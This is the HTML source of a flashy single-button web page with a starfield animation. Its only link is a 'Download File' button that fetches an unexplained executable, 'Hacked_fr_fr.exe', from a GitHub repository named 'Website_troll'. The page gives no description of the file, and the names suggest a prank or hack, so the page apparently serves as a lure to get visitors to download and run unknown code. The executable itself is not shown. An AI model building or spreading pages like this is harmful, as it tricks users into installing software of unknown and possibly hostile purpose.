<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cool Glowing Website</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: black;
            overflow: hidden;
        }
        .glow-button {
            font-size: 24px;
            padding: 15px 40px;
            border: none;
            border-radius: 30px;
            color: white;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            box-shadow: 0 0 15px #ff00ff;
            cursor: pointer;
            transition: all 0.3s ease-in-out;
            position: relative;
            overflow: hidden;
            text-decoration: none;
            text-align: center;
        }
        .glow-button:hover {
            box-shadow: 0 0 25px #00ffff, 0 0 50px #ff00ff;
            transform: scale(1.1);
        }
        .fade-in {
            opacity: 0;
            animation: fadeIn 1.5s ease-in-out forwards;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .stars {
            position: absolute;
            width: 100%;
            height: 100%;
            background: black;
            overflow: hidden;
        }
        .star {
            position: absolute;
            width: 2px;
            height: 2px;
            background: white;
            border-radius: 50%;
            opacity: 0.8;
            animation: twinkle 3s infinite;
        }
        @keyframes twinkle {
            0% { opacity: 0.3; }
            50% { opacity: 1; }
            100% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="stars" id="stars"></div>
    <a href="https://github.com/Supergoatscriptguy/Website_troll/raw/refs/heads/main/Hacked_fr_fr.exe" download class="glow-button fade-in">Download File</a>
    
    <script>
        const starsContainer = document.getElementById("stars");
        for (let i = 0; i < 150; i++) {
            let star = document.createElement("div");
            star.classList.add("star");
            star.style.top = Math.random() * 100 + "vh";
            star.style.left = Math.random() * 100 + "vw";
            star.style.animationDuration = (Math.random() * 3 + 2) + "s";
            starsContainer.appendChild(star);
        }
    </script>
</body>
</html>
